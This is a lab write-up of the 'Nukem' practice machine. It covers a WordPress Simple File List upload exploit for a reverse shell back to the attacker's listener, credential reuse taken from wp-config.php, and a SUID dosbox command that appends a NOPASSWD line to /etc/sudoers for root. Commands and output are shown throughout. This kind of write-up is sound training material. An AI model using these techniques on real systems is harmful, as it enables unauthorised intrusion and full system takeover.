#Linux #WordPress #FileUpload #CVE #CredentialReuse #SUID #dosbox #GTFOBins #sudoers

## Overview

Nukem runs a WordPress site with the Simple File List plugin (version 4.2.2) installed, which has a known arbitrary file upload vulnerability. Getting a shell as `http` leads to database credentials in `wp-config.php` that are reused by a system user. That user has a SUID `dosbox` binary, an unusual escalation path where GTFOBins' unauthorized file write entry lets the sudoers file be appended directly, granting unrestricted sudo.

## Recon

### Port Scan

```sh
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.3 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
|_http-generator: WordPress 5.5.1
3306/tcp open  mysql
5000/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.8.5)
```

Port 3306 rejected external connections (`Host not allowed to connect`). Port 5000 returned 404 for every request. The WordPress site on port 80 was the attack surface.

### WordPress Enumeration

```sh
gobuster dir -u http://192.168.183.105/ -w /home/kali/Tools/SecLists/Discovery/Web-Content/big.txt
/wordpress            (Status: 301)
/wp-admin             (Status: 301)
/wp-content           (Status: 301)
/wp-includes          (Status: 301)
```

WPScan revealed the `/uploads` directory was listable. Browsing it showed an entry for the **Simple File List** plugin.

## Foothold

### Simple File List 4.2.2, Arbitrary File Upload

Simple File List 4.2.2 is vulnerable to arbitrary file upload (Exploit-DB 48979). The plugin accepts file uploads for an end-user file browser but performs insufficient validation, allowing PHP files to be uploaded. The exploit script automates the upload and rename steps:

> **How the exploit works:** Simple File List validates file extensions on the initial upload but then performs a separate rename operation. The exploit uploads a PHP file disguised as an image and exploits the rename step to restore the `.php` extension, landing the file in a web-accessible path. Once the PHP file is accessible through the web root, visiting its URL triggers execution.

I modified the payload to point to Kali:80 and changed the Python string quoting for clean execution:

```sh
python3 sfl.py http://192.168.183.105
[ ] File 5567.png generated with password: ad36deb21ae452a8acac76c702c441c2
[ ] File uploaded at http://192.168.183.105/wp-content/uploads/simple-file-list/5567.png
[ ] File moved to http://192.168.183.105/wp-content/uploads/simple-file-list/5567.php
[+] Exploit seem to work.
```

Visited the PHP file:

```
http://192.168.183.105/wp-content/uploads/simple-file-list/5567.php
```

```sh
rlwrap nc -lvnp 80
connect to [192.168.45.244] from (UNKNOWN) [192.168.183.105] 36642
uid=33(http) gid=33(http) groups=33(http)
[http@nukem /]$ whoami
http
```

TTY upgrade:

```sh
python -c 'import pty; pty.spawn("/bin/bash")'
```

Local flag:

```sh
[http@nukem commander]$ cat local.txt
‹redacted›
```

## Privilege Escalation

### wp-config.php Credentials → commander

LinPEAS recovered database credentials from `wp-config.php`:

```
commander:CommanderKeenVorticons1990
```

The password worked for the system user `commander` via `su`:

```sh
su commander
Password: CommanderKeenVorticons1990
```

### SUID dosbox → Arbitrary Sudoers Write

A SUID binary was present at `/usr/bin/dosbox`. GTFOBins lists `dosbox` under unauthorized file writes: it can mount the host filesystem and redirect shell output into files owned by root, because `dosbox` runs as root via the SUID bit and its shell redirection respects the effective UID.

> **Why dosbox write escalates to sudo:** appending to `/etc/sudoers` with valid sudo syntax grants the named user arbitrary command execution as root without a password. The line `commander ALL=(ALL) NOPASSWD: ALL` placed in sudoers by a root-owned process takes effect immediately for the next `sudo` invocation.

```sh
LFILE='/etc/sudoers'
/usr/bin/dosbox -c 'mount c /' -c "echo commander ALL=(ALL) NOPASSWD: ALL >> c:$LFILE" -c exit
```

DOSBox mounted `/` as its C drive, then appended the sudoers line through the redirected shell output. The ALSA and audio errors in the output are noise, the file write succeeds regardless:

```
SHELL:Redirect output to c:/etc/sudoers
```

With the sudoers entry in place:

```sh
sudo /bin/bash
[root@nukem /]# whoami
root
```

## Root

```sh
[root@nukem ~]# cat proof.txt
‹redacted›
```

## Takeaways

- **WPScan's directory listing detection surfaces plugin paths that gobuster misses.** The Simple File List plugin was found through the listable uploads directory, not through a name-based plugin scan.
- **`wp-config.php` is the first credential source to check after any WordPress shell.** Database passwords routinely get reused on system accounts.
- **SUID binaries that can write to arbitrary files are as powerful as SUID shells.** A write to `/etc/sudoers` with valid syntax is permanent privilege escalation; `dosbox` with SUID achieves this cleanly through its filesystem mounting and shell redirect features.
